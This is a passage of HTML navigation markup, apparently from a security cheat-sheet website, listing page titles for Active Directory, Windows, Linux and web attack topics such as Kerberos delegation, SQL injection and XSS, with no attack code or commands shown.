  <a href="#exploit-the-constrained-delegation" class="md-nav__link">
    Exploit the Constrained Delegation
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impersonate-a-domain-user-on-a-resource" class="md-nav__link">
    Impersonate a domain user on a resource
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-resource-based-constrained-delegation" class="md-nav__link">
    Kerberos Resource Based Constrained Delegation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-bronze-bit-attack-cve-2020-17049" class="md-nav__link">
    Kerberos Bronze Bit Attack - CVE-2020-17049
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privexchange-attack" class="md-nav__link">
    PrivExchange attack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sccm-deployment" class="md-nav__link">
    SCCM Deployment
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sccm-network-access-accounts" class="md-nav__link">
    SCCM Network Access Accounts
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sccm-shares" class="md-nav__link">
    SCCM Shares
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wsus-deployment" class="md-nav__link">
    WSUS Deployment
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rodc-read-only-domain-controller" class="md-nav__link">
    RODC - Read Only Domain Controller
  </a>
  
    <nav class="md-nav" aria-label="RODC - Read Only Domain Controller">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rodc-golden-ticket" class="md-nav__link">
    RODC Golden Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rodc-key-list-attack" class="md-nav__link">
    RODC Key List Attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rodc-computer-object" class="md-nav__link">
    RODC Computer Object
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pxe-boot-image-attack" class="md-nav__link">
    PXE Boot image attack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-reconnaissance" class="md-nav__link">
    DNS Reconnaissance
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dsrm-credentials" class="md-nav__link">
    DSRM Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux-active-directory" class="md-nav__link">
    Linux Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ccache-ticket-reuse-from-tmp" class="md-nav__link">
    CCACHE ticket reuse from /tmp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ccache-ticket-reuse-from-keyring" class="md-nav__link">
    CCACHE ticket reuse from keyring
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ccache-ticket-reuse-from-sssd-kcm" class="md-nav__link">
    CCACHE ticket reuse from SSSD KCM
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ccache-ticket-reuse-from-keytab" class="md-nav__link">
    CCACHE ticket reuse from keytab
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#extract-accounts-from-etckrb5keytab" class="md-nav__link">
    Extract accounts from /etc/krb5.keytab
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
        Bind Shell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
        Cloud - AWS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
        Cloud - Azure
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
        Cobalt Strike
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
        Container - Docker Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
        Container - Kubernetes Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Escape%20Breakout/" class="md-nav__link">
        Application Escape and Breakout
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Hash%20Cracking/" class="md-nav__link">
        Hash Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Evasion/" class="md-nav__link">
        Linux - Evasion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
        Linux - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
        Linux - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
        MSSQL Server
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
        Metasploit
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
        Bug Hunting Methodology and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
        Miscellaneous & Tricks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Discovery/" class="md-nav__link">
        Network Discovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
        Network Pivoting Techniques
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Office%20-%20Attacks/" class="md-nav__link">
        Office - Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
        Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Source%20Code%20Management/" class="md-nav__link">
        Source Code Management
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
        Subdomains Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
        AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20DPAPI/" class="md-nav__link">
        Windows - DPAPI
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Defenses/" class="md-nav__link">
        Windows - Defenses
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
        Windows - Download and execute methods
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
        Windows - Mimikatz
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
        Windows - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
        Windows - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
        Windows - Using credentials
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
      
      
      
        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
          NoSQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_30">
          <span class="md-nav__icon md-icon"></span>
          NoSQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../NoSQL%20Injection/" class="md-nav__link">
        NoSQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
      
      
      
        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
          OAuth Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_31">
          <span class="md-nav__icon md-icon"></span>
          OAuth Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../OAuth%20Misconfiguration/" class="md-nav__link">
        OAuth Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
      
      
      
        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
          Open Redirect
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_32">
          <span class="md-nav__icon md-icon"></span>
          Open Redirect
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Open%20Redirect/" class="md-nav__link">
        Open URL Redirection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
      
      
      
        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
          Race Condition
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_33">
          <span class="md-nav__icon md-icon"></span>
          Race Condition
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Race%20Condition/" class="md-nav__link">
        Race Condition
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
      
      
      
        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
          Request Smuggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_34">
          <span class="md-nav__icon md-icon"></span>
          Request Smuggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Request%20Smuggling/" class="md-nav__link">
        Request Smuggling
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
      
      
      
        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
          SAML Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_35">
          <span class="md-nav__icon md-icon"></span>
          SAML Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SAML%20Injection/" class="md-nav__link">
        SAML Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
      
      
      
        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
          SQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_36">
          <span class="md-nav__icon md-icon"></span>
          SQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/" class="md-nav__link">
        SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
        Google BigQuery SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
        Cassandra Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
        DB2 Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
        Hibernate Query Language Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
        MSSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
        MYSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
        Oracle SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
        PostgreSQL injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
        SQLite Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
      
      
      
        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
          Server Side Request Forgery
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_37">
          <span class="md-nav__icon md-icon"></span>
          Server Side Request Forgery
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
        Server-Side Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
      
      
      
        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
          Server Side Template Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_38">
          <span class="md-nav__icon md-icon"></span>
          Server Side Template Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
        Server Side Template Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
      
      
      
        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
          Tabnabbing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_39">
          <span class="md-nav__icon md-icon"></span>
          Tabnabbing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tabnabbing/" class="md-nav__link">
        Tabnabbing
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
      
      
      
        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
          Type Juggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_40">
          <span class="md-nav__icon md-icon"></span>
          Type Juggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Type%20Juggling/" class="md-nav__link">
        PHP Juggling type and magic hashes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
      
      
      
        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
          Upload Insecure Files
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41">
          <span class="md-nav__icon md-icon"></span>
          Upload Insecure Files
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
        Upload Insecure Files
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_2" >
      
      
      
        <label class="md-nav__link" for="__nav_41_2" id="__nav_41_2_label" tabindex="0">
          CVE Ffmpeg HLS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_2">
          <span class="md-nav__icon md-icon"></span>
          CVE Ffmpeg HLS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
        FFmpeg HLS vulnerability
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_3" >
      
      
      
        <label class="md-nav__link" for="__nav_41_3" id="__nav_41_3_label" tabindex="0">
          Configuration Apache .htaccess
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_3">
          <span class="md-nav__icon md-icon"></span>
          Configuration Apache .htaccess
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
        .htaccess upload
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_4" >
      
      
      
        <label class="md-nav__link" for="__nav_41_4" id="__nav_41_4_label" tabindex="0">
          Configuration Busybox httpd.conf
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_4">
          <span class="md-nav__icon md-icon"></span>
          Configuration Busybox httpd.conf
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_5" >
      
      
      
        <label class="md-nav__link" for="__nav_41_5" id="__nav_41_5_label" tabindex="0">
          Configuration uwsgi.ini
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_5">
          <span class="md-nav__icon md-icon"></span>
          Configuration uwsgi.ini
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
        uWSGI configuration file
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_6" >
      
      
      
        <label class="md-nav__link" for="__nav_41_6" id="__nav_41_6_label" tabindex="0">
          Extension Flash
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_6">
          <span class="md-nav__icon md-icon"></span>
          Extension Flash
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_7" >
      
      
      
        <label class="md-nav__link" for="__nav_41_7" id="__nav_41_7_label" tabindex="0">
          Picture Image Magik
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_7">
          <span class="md-nav__icon md-icon"></span>
          Picture Image Magik
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
        Image Tragik 1 & 2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_8" >
      
      
      
        <label class="md-nav__link" for="__nav_41_8" id="__nav_41_8_label" tabindex="0">
          Zip Slip
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_8">
          <span class="md-nav__icon md-icon"></span>
          Zip Slip
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
        Zip Slip
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
      
      
      
        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
          Web Cache Deception
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_42">
          <span class="md-nav__icon md-icon"></span>
          Web Cache Deception
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
        Web Cache Deception
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
      
      
      
        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
          Web Sockets
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_43">
          <span class="md-nav__icon md-icon"></span>
          Web Sockets
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Sockets/" class="md-nav__link">
        Web Sockets
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
      
      
      
        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
          XPATH Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_44">
          <span class="md-nav__icon md-icon"></span>
          XPATH Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XPATH%20Injection/" class="md-nav__link">
        XPATH Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
      
      
      
        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
          XSLT Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_45">
          <span class="md-nav__icon md-icon"></span>
          XSLT Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSLT%20Injection/" class="md-nav__link">
        XSLT Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
      
      
      
        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
          XSS Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_46">
          <span class="md-nav__icon md-icon"></span>
          XSS Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/" class="md-nav__link">
        Cross Site Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
        XSS in Angular and AngularJS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
        XSS with Relative Path Overwrite - IE 8/9 and lower
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
      
      
      
        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
          XXE Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_47">
          <span class="md-nav__icon md-icon"></span>
          XXE Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
